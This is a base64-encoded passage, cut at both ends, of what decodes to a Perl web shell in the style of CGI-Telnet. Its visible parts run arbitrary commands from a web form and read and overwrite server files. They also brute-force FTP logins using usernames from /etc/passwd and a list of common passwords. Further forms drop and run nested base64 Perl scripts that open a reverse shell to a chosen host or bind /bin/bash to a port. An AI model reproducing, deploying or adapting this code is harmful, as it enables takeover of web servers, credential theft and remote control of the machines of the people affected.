JDEiLiRDbWRTZXAuJENtZFB3ZDsNCgkJY2hvbXAoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBydW4gY29tbWFuZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJ1bkNtZA0Kew0KCW15ICRyZXN1bHQ9IiI7DQoJJENvbW1hbmQgPSAiY2QgXCIkQ3VycmVudERpclwiIi4kQ21kU2VwLiRSdW5Db21tYW5kLiRSZWRpcmVjdG9yOw0KCWlmKCEkV2luTlQpDQoJew0KCQkkU0lHeydBTFJNJ30gPSBcJkNvbW1hbmRUaW1lb3V0Ow0KCQlhbGFybSgkQ29tbWFuZFRpbWVvdXREdXJhdGlvbik7DQoJfQ0KCWlmKCRTaG93RHluYW1pY091dHB1dCkgIyBzaG93IG91dHB1dCBhcyBpdCBpcyBnZW5lcmF0ZWQNCgl7DQoJCSR8PTE7DQoJCSRDb21tYW5kIC49ICIgfCI7DQoJCW9wZW4oQ29tbWFuZE91dHB1dCwgJENvbW1hbmQpOw0KCQl3aGlsZSg8Q29tbWFuZE91dHB1dD4pDQoJCXsNCgkJCSRfID1+IHMvKFxufFxyXG4pJC8vOw0KCQkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygiJF9cbiIpOw0KCQl9DQoJCSR8PTA7DQoJfQ0KCWVsc2UgIyBzaG93IG91dHB1dCBhZnRlciBjb21tYW5kIGNvbXBsZXRlcw0KCXsNCgkJJHJlc3VsdCAuPSAmSHRtbFNwZWNpYWxDaGFycygkQ29tbWFuZCk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCSRFbmNvZGVDdXJyZW50RGlyID0gRW5jb2RlRGlyKCRDdXJyZW50RGlyKTsNCglzdWJzdHIoJFJ1bkNvbW1hbmQsMCw1KT0iIjsNCglteSAkZmlsZT0mdHJpbSgkUnVuQ29tbWFuZCk7DQoJJHNhdmU9Jzxicj48aW5wdXQgbmFtZT0iYSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic2F2ZSIgPic7DQoJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuJFJ1bkNvbW1hbmQ7DQoJbXkgJGRpcj0iPHNwYW4gc3R5bGU9J2ZvbnQ6IDExcHQgVmVyZGFuYTsgZm9udC13ZWlnaHQ6IGJvbGQ7Jz4iLiZBZGRMaW5rRGlyKCJndWkiKS4iPC9zcGFuPiI7DQoJaWYoLXcgJEZpbGUpDQoJew0KCQkkcm93cz0iMjMiDQoJfWVsc2UNCgl7DQoJCSRtc2c9Ijxicj48Zm9udCBzdHlsZT0nY29sb3I6IHllbGxvdzsnID4gQ2Fubid0IHdyaXRlIGZpbGUhPGZvbnQ+PGJyPiI7DQoJCSRyb3dzPSIyMCINCgl9DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nI0ZGRkZGRic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCSRSdW5Db21tYW5kID0gImVkaXQgJFJ1bkNvbW1hbmQiOw0KCSRyZXN1bHQgLj0gIDw8RU5EOw0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRFbmNvZGVDdXJyZW50RGlyIj4NCgkkUHJvbXB0DQoJPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjQwIiBuYW1lPSJjIj4NCgk8aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KCTxicj5Db21tYW5kOiA8cnVuPiAkUnVuQ29tbWFuZCA8L3J1bj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJGZpbGUiID4gJHNhdmUgPGJyPiAkbXNnDQoJPGJyPjx0ZXh0YXJlYSBpZD0iZGF0YSIgbmFtZT0iZGF0YSIgY29scz0iJGNvbHMiIHJvd3M9IiRyb3dzIiBzcGVsbGNoZWNrPSJmYWxzZSI+DQpFTkQNCg0KCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJkZpbGVPcGVuKCRGaWxlLDApKTsNCgkkcmVzdWx0IC49ICI8L3RleHRhcmVhPiI7DQoJJHJlc3VsdCAuPSAiPC9mb3JtPiI7DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZpbGUgT3Blbg0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIEZpbGVPcGVuKCQpew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJbXkgJGJpbmFyeSA9IHNoaWZ0Ow0KCW15ICRyZXN1bHQgPSAiIjsNCglteSAkbiA9ICIiOw0KCWlmKC1mICRmaWxlKXsNCgkJaWYob3BlbihGSUxFLCRmaWxlKSl7DQoJCQlpZigkYmluYXJ5KXsNCgkJCQliaW5tb2RlIEZJTEU7DQoJCQl9DQoJCQl3aGlsZSAoKCRuID0gcmVhZCBGSUxFLCAkZGF0YSwgMTAyNCkgIT0gMCkgew0KCQkJCSRyZXN1bHQgLj0gJGRhdGE7DQoJCQl9DQoJCQljbG9zZShGSUxFKTsNCgkJfQ0KCX1lbHNlDQoJew0KCQlyZXR1cm4gIk5vdCdzIGEgRmlsZSEiOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQpOb3RlOiBPbmx5IHNjYW4gZnJvbSAxIHRvIDMgdXNlciA6LVM8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCR1c2VybmFtZSBuZSAiIikNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCRpbnsnc2xlZXAnfSBuZSAiMCIpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pICogMTAwMCk7DQoJCQkJCX0NCgkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmRGb3JtDQp7DQoJcmV0dXJuIDw8RU5EOw0KCTxicj48YnI+DQoNCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+DQoJIFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI2IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iODAiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+PC90ZD4NCg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJDb25uZWN0Ij48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIENsaWVudCBsaXN0ZW4gYmVmb3JlIGNvbm5lY3QgYmFjayENCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+DQoJPGJyPlsrXSBDbGllbnQgbGlzdGVuIHdpdGggY29tbWFuZDogPHJ1bj5uYyAtdnYgLWwgLXAgPHNwYW4gaWQ9ImJhIj44MDwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxicj48YnI+DQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoNCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+DQoNCgkgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxMiIgbmFtZT0iYmluZHBhc3MiIHZhbHVlPSJ2aW5ha2lkIj48L3RkPg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCaW5kIj48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIFRlc3RpbmcgLi4uLg0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgU29ja2V0OwkNCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7DQoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsNCg0KCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307DQoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOw0KCWlmKCRDbGllbnRQb3J0IGVxIDApDQoJew0KCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTsNCgl9ZWxzaWYoISRDbGllbnRBZGRyIGVxICIiKQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOw0KCQlpZigtdyAiL3RtcC8iKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgJEZpbGUgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX1lbHNlDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiaW5kcGVybCk7DQoJCWlmKC13ICIvdG1wIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmluZHBvcnQucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJpbmRwb3J0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsICRGaWxlICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojICBBcnJheSBMaXN0IERpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJtRGlyKCQpIA0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCglpZihvcGVuZGlyKERJUiwkZGlyKSkNCgl7DQoJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQl7DQoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpDQoJCQl7DQoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7DQoJCQkJaWYoLWQgJGZpbGUpDQoJCQkJew0KCQkJCQkmUm1EaXIoJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQl1bmxpbmsoJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQljbG9zZWRpcihESVIpOw0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsN